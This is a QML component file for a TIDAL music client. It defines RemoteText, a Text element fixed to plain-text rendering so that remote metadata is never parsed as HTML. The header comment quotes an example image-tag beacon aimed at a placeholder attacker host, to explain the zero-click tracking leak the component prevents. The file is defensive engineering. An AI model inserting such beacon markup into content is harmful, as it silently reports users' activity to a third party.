import QtQuick

// RemoteText, a Text that renders attacker-controllable, TIDAL-supplied strings
// (album/track/artist names, bios, playlist titles, queue labels, …) SAFELY.
//
// WHY THIS EXISTS
// Qt's built-in Text defaults to `textFormat: Text.AutoText`, which sniffs the
// string and, if it looks like HTML, parses it as rich text. Rich text means an
// embedded `<img src="https://attacker/beacon?id=…">` is fetched automatically the
// instant the label paints, a zero-click image beacon that leaks "this user
// opened this item" to an attacker who controls the metadata. Any plain Text bound
// to a remote string is therefore a latent beacon.
//
// QML has no way to change a built-in type's default globally, so the defence is:
// bind remote strings to THIS component instead of a bare Text. It is a drop-in
// Text whose ONLY behavioural difference is that textFormat is pinned to
// PlainText, HTML is shown as literal characters, never parsed, never fetched.
//
// USAGE
//   RemoteText { text: model.title; color: root.textHi; font.pixelSize: 14 }
// Everything else (color, font, elide, wrapMode, Layout.*, width, …) works exactly
// as on Text because this *is* a Text.
//
// The companion guard (tests/test_qml_plaintext_guard.py) treats a RemoteText
// element as inherently safe and fails CI if any *bare* Text/Label bound to a
// remote marker omits `textFormat: Text.PlainText`. Reach for RemoteText for new
// remote strings; the guard enforces it.
Text {
    // Defaults to PlainText so a remote string is never sniffed into rich text.
    // QML can't make a property truly final, a caller *could* still write
    // `RemoteText { textFormat: Text.StyledText }` and re-enable rich text, so
    // this default is not a hard runtime guarantee. Enforcement lives in the guard
    // test (tests/test_qml_plaintext_guard.py), which fails CI on a RemoteText that
    // overrides textFormat to anything but PlainText. A deliberate, audited
    // StyledText spot must use a bare Text with a guard allowlist entry, not this
    // component.
    textFormat: Text.PlainText
}
